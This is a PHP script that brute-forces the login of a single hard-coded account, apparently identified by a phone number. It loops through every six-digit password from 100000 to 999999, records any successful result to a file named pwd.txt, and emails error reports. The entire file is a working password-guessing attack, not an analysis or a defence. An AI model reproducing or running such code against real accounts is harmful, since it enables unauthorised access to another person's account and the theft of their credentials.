<?php
/**
 * Created by PhpStorm.
 * User: william
 * Mail：tzh.wu.qq.com
 */

namespace App;


use App\Exception\LoginErrException;
use App\Exception\LowLevelException;
use App\Main\Main;

require_once __DIR__ . '/../vendor/autoload.php';


ini_set('error_reporting', E_ALL);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '1G');
ini_set('date.timezone', 'PRC');

$index = new Main();

try {
    $username = '17172341369';
    $start = 100000;
    $end = 999999;
    while ($start <= $end) {
        try {
            $result = $index->login($username, $start++);
            if (isset($result)) {
                file_put_contents('pwd.txt', $result . '|' . $start);
            }
        } catch (LoginErrException $exception) {
            //ignore
        }
        usleep(1000);
    }
} catch (LoginErrException $exception) {
    $index->mail($index->messageBuilder(Main::TYPE_LOGIN_ERR, date('Y-m-d H:i:s'), $exception->getMessage()));
} catch (LowLevelException $exception) {
    $index->mail($index->messageBuilder(Main::TYPE_LLVL_ERR, date('Y-m-d H:i:s'), $exception->getMessage()));
} catch (\Exception $exception) {
    $index->mail($index->messageBuilder(Main::TYPE_LLVL_ERR, date('Y-m-d H:i:s'), $exception->getMessage()));
}